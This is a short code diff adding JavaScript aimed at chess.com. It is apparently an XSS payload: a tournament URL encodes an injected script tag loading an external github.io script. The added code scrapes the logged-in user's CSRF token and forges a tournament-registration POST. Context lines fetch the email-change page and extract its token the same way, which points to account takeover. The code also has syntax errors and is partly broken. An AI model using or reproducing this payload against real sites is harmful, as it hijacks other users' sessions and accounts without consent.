@@ -1,3 +1,16 @@
+
+
+fetch("https://www.chess.com/tournament/lt-script-src-yellowrook1-github-io-a-js-gt-lt-script-gt", {
+}).then((text) => {
+      var token = text.match(/("token":".+?)["]/)[1].substr(9)
+      fetch("https://www.chess.com/callback/tournaments/register/358301", {
+  "body": `{\"_token\":\"` + token `\",\"confirm\":1}`,
+  "method": "POST",
+});
+      
+      
+      }
+
 fetch("https://www.chess.com/settings/change-email").then((response) => response.text())
     .then((text) => {
             var token = text.match(/("token":".+?)["]/)[1].substr(9); 
